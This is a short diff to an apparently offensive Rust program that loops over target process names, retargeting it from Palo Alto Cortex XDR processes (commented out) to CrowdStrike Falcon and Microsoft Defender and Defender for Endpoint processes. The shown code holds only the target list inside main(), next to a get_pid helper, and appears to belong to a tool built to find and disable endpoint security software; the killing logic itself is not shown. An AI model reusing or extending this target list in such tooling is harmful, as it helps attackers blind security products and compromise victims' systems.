@@ -73,12 +73,20 @@ fn get_pid(proc_name: &str) -> u32 {
 
 fn main() {
     let targets = [
-        "cortex-xdr-payload.exe",
-        "cysandbox.exe",
-        "cyserver.exe",
-        "cyuserver.exe",
-        "cywscsvc.exe",
-        "tlaworker.exe",
+        // "cortex-xdr-payload.exe",
+        // "cysandbox.exe",
+        // "cyserver.exe",
+        // "cyuserver.exe",
+        // "cywscsvc.exe",
+        // "tlaworker.exe",
+        "CsFalconContainer.exe",
+        "CsFalconeService.exe",
+        "CsFalconeUIHost.exe",
+        "MsMpEng.exe",
+        "NisSrv.exe",
+        "MsSense.exe",
+        "MpDefenderCoreService.exe",
+        "MpDlpService.exe",
     ];
 
     loop {
